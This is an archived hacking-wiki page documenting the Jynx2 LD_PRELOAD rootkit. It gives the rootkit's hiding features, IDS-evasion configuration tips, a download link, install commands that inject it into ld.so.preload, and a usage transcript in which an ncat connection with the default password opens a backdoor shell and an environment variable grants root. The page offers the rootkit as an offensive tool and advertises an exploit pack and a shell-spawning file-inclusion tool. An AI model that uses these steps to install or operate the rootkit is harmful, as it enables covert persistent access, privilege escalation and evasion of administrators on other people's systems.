@@ -1,0 +1,483 @@
+http://www.blackhatlibrary.net/Jynx2
+HTTP/1.1 200 OK
+Server: cloudflare-nginx
+Date: Wed, 23 Jul 2014 22:23:42 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Set-Cookie: __cfduid=d70b50db880c5a8b27d8b1a329a23ead31406154221937; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.blackhatlibrary.net; HttpOnly
+X-Powered-By: PHP/5.4.15
+Content-language: en
+Vary: Accept-Encoding, Cookie
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Cache-Control: private, must-revalidate, max-age=0
+CF-RAY: 14eb48af1b9c087a-IAD
+Content-Encoding: gzip
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Jynx Rootkit/2.0 - Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</title>
+<meta name="generator" content="MediaWiki" />
+<meta name="og:title" content="Jynx Rootkit/2.0" />
+<meta name="og:type" content="article" />
+<meta name="og:image" content="http://www.blackhatacademy.org/security101/logo.png" />
+<meta name="og:site_name" content="Blackhat Academy - Security101 Wiki" />
+<meta name="og:description" content="For security reasons, we cannot remotely parse content.  Please visit the link provided to see the full article!" />
+<link rel="canonical" href="/Jynx_Rootkit/2.0" />
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="http://www.blackhatlibrary.net/api.php?action=rsd" />
+<link rel="alternate" type="application/atom+xml" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared&amp;only=styles&amp;skin=monobook&amp;*" />
+<link rel="stylesheet" href="/skins/monobook/main.css?" media="screen" />
+<!--[if lt IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE50Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE55Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 6]><link rel="stylesheet" href="/skins/monobook/IE60Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 7]><link rel="stylesheet" href="/skins/monobook/IE70Fixes.css?" media="screen" /><![endif]--><meta name="ResourceLoaderDynamicStyles" content="" />
+</head>
+<body class="mediawiki ltr ns-0 ns-subject page-Jynx_Rootkit_2_0 skin-monobook">
+<div id="globalWrapper">
+<div id="column-content"><div id="content">
+	<a id="top"></a>
+	<div id="siteNotice"><div id="localNotice"><div align="right"><i>Questions about this topic? <a href="/Special:UserLogin" title="Special:UserLogin">Sign up</a> to ask in the talk tab</i>.</div><br />
+</div></div>	<div align="center" id="ad"><script type="text/javascript"><!--
+google_ad_client = "ca-pub-3100048614381705";
+google_ad_slot = "3567986077";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+	<h1 id="firstHeading" class="firstHeading">Jynx Rootkit/2.0</h1>
+	<div id="bodyContent">
+		<div id="siteSub">From Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</div>
+		<div id="contentSub">(Redirected from <a href="/index.php?title=Jynx2&amp;redirect=no" title="Jynx2">Jynx2</a>)</div>
+		<div id="jump-to-nav">Jump to: <a href="#column-one">navigation</a>, <a href="#searchInput">search</a></div>
+		<!-- start content -->
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>Jynx2 is an expansion of the <a href="/Jynx_Rootkit/1.0" title="Jynx Rootkit/1.0">original Jynx</a> <a href="/LD_Preload" title="LD Preload">LD_Preload</a> rootkit written in <a href="/C" title="C">C</a> with several modifications for multi-factor authentication, a more compatible shell drop, and additional hiding features.
+</td></tr></table>
+<pre><strong>                _   _,.-.' .-.
+            _ .' |,'   ."".| |.""._
+           ( || ,',"". `._`' `  '  `.
+           `\ | `" .-"`-..`     .    `.
+            |     `..--.._       |     \
+          _,|      _...'_.'     ,+.     `.
+     ,""'|   `...-'..""(__.._ -"   `"--.. `.
+    |`._,'  ,'  /\ .'""` .'""`. `.    |  `. \
+    '      / / /  ||    ||    |.`.`.   .   | \
+     `.__,'-._'  /|` -"'  `-.'  \ \ \   `"-'  \
+      ' `.   /  /_| | |'""| | .-""'`'"`-,.-"\  .
+     . / .\ .  /  | | `._.' ||        ,'     \  \
+    ' / / |/  /_.-+._`-..--"-.       .   .    \  `
+   / /.'  '  ,'""'-. `"."'""'`..     |.        \  \
+  / . |  j  .       . |        |\__," |.  `    '   \
+ .  | |  |  |       ' |        '|   | ' `  \    \   .
+ |    |  |  `.____,'   ..____,' |   |    .       \
+ |    |  |  | ._  _..---._   _,'    |       .        '
+ |    |  |  | | ""  .    |`"'   \ `.|     '  '  '     .
+ |    |  |  | |     |    |       `  `      .  .  \    |
+ |    |  |  | |     '    |        \  `.    |  |   .   |
+ '    '  |  | |      .   `         \   \   |  |   |   |
+  \      `  | |      |              .   `. |  |   |   |
+   \      \ ' |      `    '          `    `+..|___|___|_........
+    \      \ \|       '    .           `.    `.                 |
+     `.     \ .        .   `             `.    `-.            .'
+    _,'`.    \'         .   \              `-.._  `._       ,'
+ _."     `._ `.`        |    .                       `._   .
+`._       _,`"--`.      |     .                         `. |
+  `-._ ,'              |      `.                         `|_
+     ,'         |      |        `.                          `.
+   .'   __...__.|      |          \ __..._     _,..,.__       `.
+   `-`"'        `._..--'-.__      .'      `-..'        ``'"--..-'
+                            `"---' 
+                            
+                            
+    /$$$$$                                      /$$   /$$ /$$   /$$    
+   |__  $$                                     | $$  /$$/|__/  | $$    
+      | $$ /$$   /$$ /$$$$$$$  /$$   /$$       | $$ /$$/  /$$ /$$$$$$  
+      | $$| $$  | $$| $$__  $$|  $$ /$$//$$$$$$| $$$$$/  | $$|_  $$_/  
+ /$$  | $$| $$  | $$| $$  \ $$ \  $$$$/|______/| $$  $$  | $$  | $$    
+| $$  | $$| $$  | $$| $$  | $$  &gt;$$  $$        | $$\  $$ | $$  | $$ /$$
+|  $$$$$$/|  $$$$$$$| $$  | $$ /$$/\  $$       | $$ \  $$| $$  |  $$$$/
+ \______/  \____  $$|__/  |__/|__/  \__/       |__/  \__/|__/   \___/  
+           /$$  | $$                                                   
+          |  $$$$$$/                                                   
+           \______/
+</pre>
+<p></strong>
+</p>
+<table style="background: #FFC1C1; border: 2px solid #FF7070; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/RPU0j.png" alt="RPU0j.png" />
+</td>
+<td>  It is a crime to use techniques or tools on this page against any system without written authorization unless the system in question belongs to you
+</td></tr></table>
+<p><font size="-2">Special thanks to <a href="/User:ErrorProne" title="User:ErrorProne">ErrorProne</a> and <a href="/User:Xochipilli" title="User:Xochipilli">xo</a> for their contributions to this article.</font>
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="#Features"><span class="tocnumber">1</span> <span class="toctext">Features</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="#Archive_Contents"><span class="tocnumber">2</span> <span class="toctext">Archive Contents</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="#Configuration_Options_in_Config.h"><span class="tocnumber">3</span> <span class="toctext">Configuration Options in Config.h</span></a>
+<ul>
+<li class="toclevel-2 tocsection-4"><a href="#MAGIC_STRING"><span class="tocnumber">3.1</span> <span class="toctext">MAGIC_STRING</span></a></li>
+<li class="toclevel-2 tocsection-5"><a href="#MAGIC_GID_and_MAGIC_UID"><span class="tocnumber">3.2</span> <span class="toctext">MAGIC_GID and MAGIC_UID</span></a></li>
+<li class="toclevel-2 tocsection-6"><a href="#REALITY_PATH"><span class="tocnumber">3.3</span> <span class="toctext">REALITY_PATH</span></a></li>
+<li class="toclevel-2 tocsection-7"><a href="#CONFIG_FILE"><span class="tocnumber">3.4</span> <span class="toctext">CONFIG_FILE</span></a></li>
+<li class="toclevel-2 tocsection-8"><a href="#MULTI-FACTOR_AUTHENTICATION"><span class="tocnumber">3.5</span> <span class="toctext">MULTI-FACTOR AUTHENTICATION</span></a></li>
+<li class="toclevel-2 tocsection-9"><a href="#LIBC_PATH"><span class="tocnumber">3.6</span> <span class="toctext">LIBC_PATH</span></a></li>
+<li class="toclevel-2 tocsection-10"><a href="#ENV_VARIABLE"><span class="tocnumber">3.7</span> <span class="toctext">ENV_VARIABLE</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-11"><a href="#Download_.26_Installation"><span class="tocnumber">4</span> <span class="toctext">Download &amp; Installation</span></a>
+<ul>
+<li class="toclevel-2 tocsection-12"><a href="#Installation"><span class="tocnumber">4.1</span> <span class="toctext">Installation</span></a></li>
+<li class="toclevel-2 tocsection-13"><a href="#Usage"><span class="tocnumber">4.2</span> <span class="toctext">Usage</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-14"><a href="#Further_Reading"><span class="tocnumber">5</span> <span class="toctext">Further Reading</span></a></li>
+</ul>
+</td></tr></table>
+<h1> <span class="mw-headline" id="Features">Features</span></h1>
+<ul><li> Hiding from netstat
+</li><li> Hiding from ps/top and /proc
+</li><li> File hiding
+</li><li> SSL connect accept() hook
+</li><li> Multi-factor authentication
+</li><li> Improved anti-removal features
+</li><li> SUID Drop-shell with environment variable
+</li></ul>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> It is possible to make Jynx2 even more difficult to remove by hooking <a href="/C" title="C">C</a>'s link() function, therefore we recommend that any <a href="/LD_Preload" title="LD Preload">LD_Preload</a> rootkit be removed using a LiveCD.</div>
+<h1> <span class="mw-headline" id="Archive_Contents">Archive Contents</span></h1>
+<pre> [root@ares jynx2]# ls
+ Makefile  README  config.h  jynx2.c  packer.sh  reality.c
+</pre>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>In this rendition of jynx, two <b>shared libraries</b> are built by the installation process.  One, <b>jynx2.so</b> functions as the actual rootkit, while the other, <b>reality.so</b>, functions as a method for the remote access user to be able to see their own files and processes.
+</td></tr></table>
+<h1> <span class="mw-headline" id="Configuration_Options_in_Config.h">Configuration Options in Config.h</span></h1>
+<table style="background: #FFC1C1; border: 2px solid #FF7070; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/RPU0j.png" alt="RPU0j.png" />
+</td>
+<td>Improper configuration of Jynx2 can result in severe system instability, including <a href="/Segmentation_fault" title="Segmentation fault">segmentation faults</a> of nearly every process on the infected host.
+</td></tr></table>
+<h2> <span class="mw-headline" id="MAGIC_STRING">MAGIC_STRING</span></h2>
+<ul><li> <b>MAGIC_STRING</b> is the name of the directory that jynx installs to from the top level directory <b>/</b>.  By default, this directory is hidden from the root user via the magic <b>UID</b> and <b>GID</b>.  If the <b>MAGIC_STRING</b> is set to "hiddendir", jynx2 will install to (and hide) the folder "/hiddendir".
+</li></ul>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>this can be used as a prefix to any files or processes that the user wishes to hide; it is not limited exclusively to Jynx2's installation directory.
+</td></tr></table>
+<h2> <span class="mw-headline" id="MAGIC_GID_and_MAGIC_UID">MAGIC_GID and MAGIC_UID</span></h2>
+<ul><li> Similar to the original <a href="/Jynx_Rootkit" title="Jynx Rootkit" class="mw-redirect">Jynx Rootkit</a>, Jynx2 will automatically hide processes, files, and connections owned by the magic UID or GID.  
+</li></ul>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> Due to the fact that adding a user/group to the machine may set off a <a href="/HIDS" title="HIDS">HIDS</a>, we recommend that the MAGIC_UID and MAGIC_GID be set to a commonly unused service user's information (e.g. cupsd or lp's UID and GID) for maximum <a href="/IDS_Evasion" title="IDS Evasion" class="mw-redirect">IDS Evasion</a>, as no files will suddenly disappear and the least files in /etc/ will be modified.</div>
+<h2> <span class="mw-headline" id="REALITY_PATH">REALITY_PATH</span></h2>
+<ul><li> <i>This is the path where <b>reality.so</b> will be copied to.  By default, Jynx2 will install this into /XxJynx/reality.so.  </i><div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> It is recommended to set REALITY_PATH to <b>/$MAGIC_STRING/reality.so</b> in order to keep this file hidden from the root user.</div>
+</li></ul>
+<h2> <span class="mw-headline" id="CONFIG_FILE">CONFIG_FILE</span></h2>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>The <b>CONFIG_FILE</b> defaults to ld.so.preload, which is commonly located in the /etc directory.  Alternatively, services can be backdoored by setting the <a href="/LD_Preload" title="LD Preload">LD_PRELOAD</a> environment variable if overwriting /etc/ld.so.preload is unfavorable.
+</td></tr></table>
+<h2> <span class="mw-headline" id="MULTI-FACTOR_AUTHENTICATION">MULTI-FACTOR AUTHENTICATION</span></h2>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> <b><i>Jynx2 uses two-factor <a href="/Authentication_credential" title="Authentication credential">authentication</a>. </i></b>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<p>With Jynx2, the MAGIC_ACK/MAGIC_SEQ port-knocking authentication method was deprecated in favor of HIGH_PORT, LOW_PORT, and an accept() hook.  This means that Jynx2 can backdoor any existing listening service without interrupting normal user interactivity for that service.
+</p>
+</td></tr></table></div>
+<p>The first are <b>HIGH_PORT</b> and <b>LOW_PORT</b>, which default to 41, and 43 respectively.  The source port of a client connection must fall between this port range in order to activate Jynx2's accept() hook.  Because this port is typically reserved for inbound connections, it is rare that any connection will randomly have this origin port.
+The second factor in Jynx2 authentication is SHELL_PASSWORD.   This should be the first line sent to the backdoor upon connecting, defaulting to "<b>DEFAULT_PASS</b>", it should be changed before compilation.
+</p>
+<h2> <span class="mw-headline" id="LIBC_PATH">LIBC_PATH</span></h2>
+<p>LIBC_PATH is set in config.h and defines the path to the libc binary, which can be obtained by using ldd against any common coreutil or binutil.  In order to locate this, simply run <b>ldd $(which ls)</b> or something similar. 
+</p>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> On multi-lib systems, configure this path to point to the <b>64-bit</b> version of LIBC.</div>
+<h2> <span class="mw-headline" id="ENV_VARIABLE">ENV_VARIABLE</span></h2>
+<p>A new feature in Jynx2 is the ability to drop a local suid shell using an environment variable as defined in the configuration.  When this environment variable is set, SUID executables will grant root access to the local machine for <a href="/Privilege_escalation" title="Privilege escalation">privilege escalation</a> by the remote user.
+</p>
+<h1> <span class="mw-headline" id="Download_.26_Installation">Download &amp; Installation</span></h1>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>It is highly recommended that configuration be changed before compiling or installing Jynx2 to any device.
+</td></tr></table>
+<ul><li> <b>Download URL</b>: <a href="http://blackhatlibrary.net/releases/jynx2.tgz" class="external free" rel="nofollow">http://blackhatlibrary.net/releases/jynx2.tgz</a>
+</li></ul>
+<h2> <span class="mw-headline" id="Installation">Installation</span></h2>
+<pre> # tar xzf jynx2.tgz     # Unpack tarball
+ # nano -w config.h      # Set configuration
+ # make all              # Compile jynx2.so                                                      
+ # make install          # Installs jynx2, injects into ld preload, and sets correct GIDs
+</pre>
+<h2> <span class="mw-headline" id="Usage">Usage</span></h2>
+<p>Once Jynx2 is successfully installed on a target machine, accessing it's accept() hook with the default configuration looks like:
+</p>
+<pre>
+[user@host ~]$ sudo ncat exploit.net 80 -p 42 --ssl
+DEFAULT_PASS
+Bump with shell.
+&gt;ls -lia 
+ 214473 drwxr-xr-x  2 user users   176 Mar  7 19:19 .
+ 177137 drwxr-xr-x 15 user users   952 Mar  5 22:15 ..
+</pre>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong>  Make sure to using the <i>--ssl</i> flag with ncat, otherwise Jynx2 will not accept the connection, with the connection's file descriptor being passed to the backdoored service in stead.</div>
+<p>By default, with XxJynx as the ENV_VARIABLE configuration:
+</p>
+<pre> &gt;XxJynx=1 gpasswd /
+ &gt;id 
+ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)
+</pre>
+<h1> <span class="mw-headline" id="Further_Reading">Further Reading</span></h1>
+<ul><li> <a href="/Hooking_PAM" title="Hooking PAM" class="mw-redirect">Hooking PAM</a>
+</li><li> <a href="/C" title="C">C</a>
+</li><li> <a href="/Jynx_Rootkit/1.0" title="Jynx Rootkit/1.0">Jynx version 1.0</a>
+</li><li> <a href="/LD_Preload" title="LD Preload">LD_Preload</a>
+</li><li> <a href="http://resources.infosecinstitute.com/jynx2-sneak-peek-analysis/" class="external text" rel="nofollow">Jynx2 Sneak peek, Analysis and Removal Instructions (Infosec Institute)</a>
+</li></ul>
+<center>We have more tools coming soon!  Look forward to <b>Chimera Live CD</b>.</center>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td><center>These are the offensive security tools developed by <a href="/Staff" title="Staff" class="mw-redirect">our wiki staff</a>.</center>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<ul><li> <a href="/Vanguard" title="Vanguard">Vanguard</a> - <i><a href="/Web_Exploitation" title="Web Exploitation" class="mw-redirect">web application vulnerability</a> testing engine written in <a href="/Perl" title="Perl">Perl</a></i>
+</li><li> <a href="/Jynx2" title="Jynx2" class="mw-redirect">Jynx2</a> - <i>A second version of the classic <a href="/LD_Preload" title="LD Preload">LD_Preload</a> <a href="/Jynx_Rootkit" title="Jynx Rootkit" class="mw-redirect">Jynx Rootkit</a> written in <a href="/C" title="C">C</a></i>
+</li><li> <a href="/Bleeding_Life" title="Bleeding Life">Bleeding Life</a> - <i><a href="/PHP" title="PHP">PHP</a> and <a href="/MySQL" title="MySQL">MySQL</a> powered web browser <a href="/Buffer_Overflows" title="Buffer Overflows" class="mw-redirect">buffer overflow</a> exploit pack</i>
+</li><li> <a href="/GScrape" title="GScrape">GScrape</a> - <i><a href="/Perl" title="Perl">Perl</a> based google scraper for finding <a href="/Web_Exploitation" title="Web Exploitation" class="mw-redirect">vulnerable websites</a></i>
+</li><li> <a href="/Kolkata" title="Kolkata">Kolkata</a> - <i>Configurable web application fingerprinting engine using file <a href="/Cryptography" title="Cryptography">checksums</a> written in <a href="/Perl" title="Perl">Perl</a></i>
+</li><li> <a href="/Lfi_autopwn.pl" title="Lfi autopwn.pl">Lfi_autopwn.pl</a> - <i>automatically spawn a shell using a <a href="/File_inclusion" title="File inclusion" class="mw-redirect">File inclusion</a> exploit, written in <a href="/Perl" title="Perl">Perl</a>.</i>
+</li><li> <a href="/MySql_5_Enumeration" title="MySql 5 Enumeration" class="mw-redirect">MySql 5 Enumeration</a> - <i>automatically map the contents of a remote database given a URL vulnerable to <a href="/SQL_injection" title="SQL injection">SQL injection</a>, written in <a href="/Perl" title="Perl">Perl</a></i>
+</li><li> <a href="http://chokepoint.net/?id=5" class="external text" rel="nofollow">Social Network Forgery Utility</a> - <i>Rickroll your friends with this <a href="/PHP" title="PHP">PHP</a> <a href="/XSCF" title="XSCF">content forgery</a> generation utility.</i>
+</li></ul>
+</td></tr></table>
+</td></tr></table>
+<table style="width: 60%; margin: 0.5em auto; background-color: #FFFFFF; border: 5px double #9DA8B0" cellspacing="6">
+
+<tr>
+<td>
+</td>
+<td style="text-align: center;">
+<p><br />
+</p>
+<p style="font-size:1.5em; line-height:1em;"><b>Jynx2</b><br />is part of a series on</p>
+<p style="font-size:3em; line-height:1em;"><b><a href="/Linux" title="Linux">Linux</a></b></p>
+<p style="font-size:1.5em; line-height:1em;">Visit the <b><a href="/Linux" title="Linux">Linux Portal</a></b> for complete coverage.</p>
+<p><br />
+</p>
+<p>
+<a name="fb_share"></a><script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share" type="text/javascript"></script>
+<br /><br />
+<a data-related="blackhatstaff" data-count="0" data-via="blackhatstaff" href="https://twitter.com/share" class="twitter-share-button">Tweet</a><script src="//platform.twitter.com/widgets.js" type="text/javascript"></script>
+<br /><br />
+
+<a class="DiggThisButton DiggCompact"></a>
+<script type="text/javascript">
+(function() {
+  var s = document.createElement('SCRIPT'), s1 = document.getElementsByTagName('SCRIPT')[0];
+  s.type = 'text/javascript';
+  s.async = true;
+  s.src = 'http://widgets.digg.com/buttons.js';
+  s1.parentNode.insertBefore(s, s1);
+})();
+</script>
+
+<br /><br />
+<script type="text/javascript" src="http://www.reddit.com/static/button/button1.js"></script>
+</p>
+</td></tr></table>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 210/1000000
+Post-expand include size: 11227/2097152 bytes
+Template argument size: 5039/2097152 bytes
+Expensive parser function count: 0/100
+-->
+<div class="printfooter">
+Retrieved from "<a href="http://www.blackhatlibrary.net/Jynx_Rootkit/2.0">http://www.blackhatlibrary.net/Jynx_Rootkit/2.0</a>"</div>
+		<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks"><a href="/Special:Categories" title="Special:Categories">Category</a>: <span dir='ltr'><a href="/Category:Maintaining_Access" title="Category:Maintaining Access">Maintaining Access</a></span></div></div>		<!-- end content -->
+				<div class="visualClear"></div>
+	</div>
+</div></div>
+<div id="column-one">
+	<div id="p-cactions" class="portlet">
+		<h5>Views</h5>
+		<div class="pBody">
+			<ul>
+				 <li id="ca-nstab-main" class="selected"><a href="/Jynx_Rootkit/2.0" title="View the content page [c]" accesskey="c">Page</a></li>
+				 <li id="ca-talk" class="new"><a href="/index.php?title=Talk:Jynx_Rootkit/2.0&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+				 <li id="ca-viewsource"><a href="/index.php?title=Jynx_Rootkit/2.0&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+				 <li id="ca-history"><a href="/index.php?title=Jynx_Rootkit/2.0&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class="portlet" id="p-personal">
+		<h5>Personal tools</h5>
+		<div class="pBody">
+			<ul>
+				<li id="pt-login"><a href="/index.php?title=Special:UserLogin&amp;returnto=Jynx_Rootkit/2.0" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class="portlet" id="p-logo">
+		<a style="background-image: url(/logo.png);" href="/Main_Page" title="Visit the main page"></a>
+	</div>
+	<script type="text/javascript"> if (window.isMSIE55) fixalpha(); </script>
+	<div class='generated-sidebar portlet' id='p-Wiki'>
+		<h5>Wiki</h5>
+		<div class='pBody'>
+			<ul>
+				<li id="n-mainpage-description"><a href="/Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
+				<li id="n-The-index"><a href="/Category:Indexing">The index</a></li>
+				<li id="n-Donate"><a href="/Donations">Donate</a></li>
+				<li id="n-Contribute"><a href="/Category:Requested_maintenance">Contribute</a></li>
+				<li id="n-recentchanges"><a href="/Special:RecentChanges" title="The list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
+				<li id="n-randompage"><a href="/Special:Random" title="Load a random page [x]" accesskey="x">Random page</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class='generated-sidebar portlet' id='p-Community'>
+		<h5>Community</h5>
+		<div class='pBody'>
+			<ul>
+				<li id="n-Chokepoint"><a href="http://www.chokepoint.net">Chokepoint</a></li>
+				<li id="n-.2Fr.2Fblackhat"><a href="http://reddit.com/r/blackhat">/r/blackhat</a></li>
+				<li id="n-.40BlackhatStaff"><a href="http://twitter.com/BlackhatStaff">@BlackhatStaff</a></li>
+			</ul>
+		</div>
+	</div>
+	<div id="p-search" class="portlet">
+		<h5><label for="searchInput">Search</label></h5>
+		<div id="searchBody" class="pBody">
+			<form action="/index.php" id="searchform">
+				<input type='hidden' name="title" value="Special:Search"/>
+				<input id="searchInput" title="Search Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools" accesskey="f" type="search" name="search" />
+				<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Go" title="Go to a page with this exact name if exists" />&#160;
+				<input type='submit' name="fulltext" class="searchButton" id="mw-searchButton" value="Search" title="Search the pages for this text" />
+			</form>
+		</div>
+	</div>
+	<div class="portlet" id="p-tb">
+		<h5>Toolbox</h5>
+		<div class="pBody">
+			<ul>
+				<li id="t-whatlinkshere"><a href="/Special:WhatLinksHere/Jynx_Rootkit/2.0" title="List of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+				<li id="t-recentchangeslinked"><a href="/Special:RecentChangesLinked/Jynx_Rootkit/2.0" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+<li id="t-specialpages"><a href="/Special:SpecialPages" title="List of all special pages [q]" accesskey="q">Special pages</a></li>
+				<li id="t-print"><a href="/index.php?title=Jynx_Rootkit/2.0&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>				<li id="t-permalink"><a href="/index.php?title=Jynx_Rootkit/2.0&amp;oldid=46544" title="Permanent link to this revision of the page">Permanent link</a></li>			</ul>
+		</div>
+	</div>
+&nbsp;
+
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-3100048614381705";
+/* BHL Sidebar */
+google_ad_slot = "2730381272";
+google_ad_width = 120;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+
+<a href="http://www.srsvps.com/"><center><img src="http://blackhatlibrary.net/images/srsvps-button-tux.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
+<a href="http://vps-heaven.com/"><center><img src="http://blackhatlibrary.net/images/vps-heaven.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
+<center>VPS-Heaven now accepting BitCoin!</center><br />
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-40369725-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+<a href="http://www.soldierx.com/"><center><img src="http://www.soldierx.com/system/files/images/sx-mini-1.jpg" style="padding: 2px,0px,2px,0px;"></center></a>
+<br /><br /><center>Our research is made possible by your support.</center><br />
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
+<input type="hidden" name="cmd" value="_s-xclick">
+<input type="hidden" name="hosted_button_id" value="74Q9CEK92HZCL">
+<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
+</form>
+</div><!-- end of the left (by default at least) column -->
+<div class="visualClear"></div>
